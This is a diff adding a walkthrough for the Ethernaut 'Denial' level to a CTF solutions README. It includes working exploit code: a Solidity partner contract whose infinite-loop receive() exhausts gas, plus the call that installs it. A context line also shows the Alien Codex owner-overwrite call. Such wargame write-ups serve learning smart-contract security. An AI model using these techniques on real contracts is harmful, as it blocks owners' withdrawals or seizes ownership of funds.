@@ -51,6 +51,7 @@ yarn start -- <level_name>
  - [18. Recovery](#18-recovery)
  - [19. Magic Number](#19-magic-number)
  - [20. Alien Codex](#20-alien-codex)
+ - [21. Denial](#21-denial)
 
 ### 1. Hello Ethernaut
 
@@ -854,3 +855,43 @@ And finally, overwrite the `_owner` variable by setting our address in the last 
 ```js
 contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', '0x000000000000000000000000' + player.slice(2), {from:player, gas: 900000});
 ```
+
+---
+
+### 21. Denial
+
+The key of this level is to understand how the secuence of events occur
+
+```sol
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint amountToSend = address(this).balance.div(100);
+        partner.call{value:amountToSend}("");
+        owner.transfer(amountToSend);
+        timeLastWithdrawn = now;
+        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
+    }
+```
+
+Note that before transferring the tokens to the owner, the partner receives its part. If we use a smart contract as a partner, we can make that line consume all the gas with our custom implementation in the `receive()` function of our contract.
+
+This way, the owner will not be able to withdraw its tokens due to the gas consumption.
+
+Our partner contract should look as follows
+
+```sol
+contract Partner {
+    receive() external payable {
+        while (true) {
+          
+        }
+    }
+}
+```
+
+Then set the contract as a partner
+
+```js
+await contract.setWithdrawPartner('<your_contract_address>')
+```
+
